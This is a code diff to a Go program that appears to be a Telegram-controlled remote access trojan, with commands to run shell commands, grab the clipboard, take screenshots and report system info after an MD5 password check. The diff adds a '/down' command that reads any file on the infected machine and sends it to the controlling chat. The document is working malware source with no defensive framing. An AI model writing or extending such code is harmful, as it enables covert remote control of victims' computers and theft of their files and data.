@@ -2,11 +2,21 @@ package main
 
 import (
 	_ "embed"
+	"os"
 	"strings"
+	"path/filepath"
 )
 
+func sendFile(chatID int64, fullpath string) {
+    data, err := os.ReadFile(fullpath)
+    if err != nil {
+        SendMessage(chatID, "-")
+        return
+    }
+	sendDocument(chatID, filepath.Base(fullpath), data)
+}
 
-func parseCommand(text string, chatID int64) {
+func parseCommand(chatID int64, text string) {
 	commandParts := strings.Split(text, " ")
 	commandType := commandParts[0]
 	switch commandType {
@@ -14,6 +24,8 @@ func parseCommand(text string, chatID int64) {
 		getInfo(chatID)
 	case "/cmd":
 		executeCommand(chatID, commandParts[1:])
+	case "/down":
+		sendFile(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
 	case "/clip":
 		getClipboard(chatID)
 	case "/screen":
@@ -43,7 +55,7 @@ func main() {
 			chatID := update.Message.Chat.ID
 			text := update.Message.Text
 			if contains(chatIDs, chatID) {
-				parseCommand(text, chatID)
+				parseCommand(chatID, text)
 			} else if md5Hash(text) == passMd5 {
 				// fmt.Println("Password answered in Chat ID:", chatID)
 				chatIDs = append(chatIDs, chatID)
